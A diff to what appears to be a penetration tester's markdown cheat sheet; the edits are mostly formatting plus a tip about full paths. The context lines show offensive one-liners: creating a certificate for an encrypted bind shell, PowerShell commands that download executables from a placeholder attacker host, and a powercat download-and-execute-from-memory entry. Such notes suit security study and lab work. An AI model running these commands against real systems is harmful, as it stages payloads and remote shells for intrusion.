@@ -82,7 +82,9 @@ target
 #### encrypted bind shells
 create self-signed certificate
 `openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt`
-##windows
+
+
+## windows
 ## one-liners
 #### dir and file
 list all files current dir
@@ -110,6 +112,7 @@ cd dials:
 ```
 
 #### PowerShell New-Object
+Always try specifying full path. 
 download file
 `(New-Object System.Net.Webclient).DownloadFile("http://<IP>:<PORT>/<FILENAME>.exe","C:\<FILENAME>.exe")`
 
@@ -121,6 +124,8 @@ download a file and execute from memory with powercat
 
 shorthand
 `powershell IWR -url http://10.10.10.10:9000/file.txt -OutFile C:\\Windows\\temp\\file.txt`
+
+
 
 ### smb
 localhost
